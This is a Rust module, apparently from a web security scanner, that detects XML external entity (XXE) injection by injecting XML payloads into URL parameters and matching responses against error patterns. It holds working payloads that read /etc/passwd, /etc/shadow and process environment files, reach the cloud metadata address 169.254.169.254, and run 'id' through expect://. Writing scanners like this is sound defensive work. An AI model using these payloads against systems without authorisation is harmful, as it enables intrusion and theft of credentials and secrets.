//! XXE (XML External Entity) injection detection.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

const XXE_ERROR_PATTERNS: &[&str] = &[
    r"(?i)Entity not found",
    r"(?i)External entity",
    r"(?i)XML parser error",
    r"(?i)DOCTYPE",
    r"(?i)ENTITY",
    r"(?i)SAXParseException",
    r"(?i)javax\.xml",
    r"(?i)org\.apache\.xerces",
    r"(?i)com\.sun\.org\.apache",
    r"(?i)org\.xml\.sax",
    r"(?i)XMLReader",
    r"(?i)XMLStreamException",
];

const XXE_BLIND_INDICATORS: &[&str] = &[
    r"\bssrf\b",
    r"\back\b",
    r"\boob\b",
    r"\bdns\b",
    r"\binteraction\b",
    r"\breceived\b",
];

pub async fn check_xxe(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let params: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    if params.is_empty() {
        return Ok(findings);
    }

    let xxe_payloads = vec![
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
            "/etc/passwd",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"#,
            "php://",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>"#,
            "169.254",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>"#,
            "win.ini",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>"#,
            "uid=",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>"#,
            "root:",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#,
            "root:",
        ),
        (
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>"#,
            "HOME=",
        ),
    ];

    for (param_name, _) in &params {
        for (payload, indicator) in &xxe_payloads {
            let mut test_url = url.clone();
            {
                let mut p = test_url.query_pairs_mut();
                p.clear();
                for (k, v) in &params {
                    p.append_pair(k, if k == param_name { payload } else { v });
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
            {
                let body_lower = response.body.to_lowercase();
                if body_lower.contains(indicator) || body_lower.contains("root:") {
                    let mut f = Finding::new(
                        format!(
                            "XXE detected in parameter '{}' — entity returned system file content",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(611);
                    f.evidence.push(Evidence::redacted(
                        "xxe",
                        format!("Payload: {}", payload.chars().take(80).collect::<String>()),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Disable external entity parsing in XML parsers, or use a less featureful data format like JSON.".into();
                    f.references.push("https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing".into());
                    findings.push(f);
                    break;
                }

                for pattern in XXE_ERROR_PATTERNS {
                    if let Ok(re) = Regex::new(pattern)
                        && re.is_match(&response.body)
                    {
                        let mut f = Finding::new(
                            format!(
                                "Potential XXE in parameter '{}' — XML parser error detected",
                                param_name
                            ),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::High,
                            Confidence::Likely,
                            "grym-web-scanner",
                        );
                        f.categories.push("A05:2025-Injection".into());
                        f.cwe_ids.push(611);
                        f.evidence.push(Evidence::redacted(
                            "xxe-error",
                            format!(
                                "XML error pattern: {} with payload: {}",
                                pattern,
                                payload.chars().take(60).collect::<String>()
                            ),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        findings.push(f);
                        break;
                    }
                }
            }
        }
    }
    Ok(findings)
}
